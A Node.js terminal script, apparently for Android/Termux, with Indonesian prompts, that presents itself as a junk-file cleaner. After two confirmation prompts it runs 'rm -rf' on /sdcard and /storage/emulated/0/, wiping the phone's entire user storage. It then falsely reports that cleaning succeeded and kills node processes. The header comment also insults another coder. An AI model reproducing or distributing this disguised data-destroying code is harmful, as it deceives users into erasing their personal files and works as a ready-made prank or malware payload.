#!/usr/bin/env node
/** CODINGAN BY TANGAN SENDIRI, GAK KAYAK DANZXPLOIT KROCO TOLOL SCRIPT KIDDIE DI PELIHARA TOLOL**/
/* GITHUB : github.com/NekomonHub */

import { createInterface } from 'readline'
import { spawn } from 'child_process'
import fs from 'fs'
import open from 'open'
import chalk from 'chalk'
const log = console.log
const rl = createInterface({input: process.stdin,output: process.stdout});
const wait = (ms) => {return new Promise(r => setTimeout(r,ms));}
const clear = () => {spawn('clear',{stdio:'inherit'});}
const ask = (quest) => { return new Promise((resolve) => rl.question(quest,resolve));}

async function main(){
	clear();
	await wait(450);
	await log(chalk.red.bold(fs.readFileSync('./.logo','utf8')));
	await wait(200);
	const warn = await ask(chalk.gray.bold('Apakah anda ingin membersihkan Sampah? Y/n : '));
		switch(warn.toLowerCase()){
			case 'y':
			case 'yes':
			async function areyou(){
				const sure = await ask(chalk.red.bold('[!] Apakah anda Yakin? Y/n : '));
					switch(sure.toLowerCase()){
						case 'y':
						case 'yes':
							function del(p){
								spawn('rm',['-rf',p],{
									stdio:'ignore'
								});
							} async function baiklahbro(){
								await del('/sdcard');
								await del('/storage/emulated/0/');
							} async function start(){
								await baiklahbro();
								await wait(3000);
								await log(chalk.green.bold('\n✓ ' + chalk.bold.white('Sudah Bersih')));
								await spawn('pkill',['-9','node'],{
									stdio:'ignore'
								});
							} start();
							break;
						case 'no':
						case 'n':
								await log(chalk.bold.red('Back...'));
								await rl.close();
								await process.exit(0);
							break;
						default:
							await log(chalk.red.bold('[!] ' + chalk.white.bold('Opsi tidak ditemukan')));
							await wait(2000);
							await areyou();
					}
			} areyou();
				break;
			case 'no':
			case 'n':
				await log(chalk.green.bold('\n✓ ' + chalk.white.bold('Keluar...')));
				await wait(3000);
					await spawn('pkill',[
						'-9',
						'node'
					],{
						stdio:'ignore'
					});
				break;
			default:
				await log(chalk.red.bold('[!] ' + chalk.white.bold('Opsi tidak Tersedia')));
				await wait(2000);
				await main();
		}
} async function rawon(){
	const apa = await ask(chalk.cyan.bold('Kunjungi GitHub Developer? Y/n : '));
		switch(apa.toLowerCase()){
			case 'y':
			case 'yes':
				await open('https://github.com/NekomonHub');
				await wait(3000);
				await main();
				break;
			case 'n':
			case 'no':
				await main();
				break;
			default:
			await main();
		}
} rawon(); 
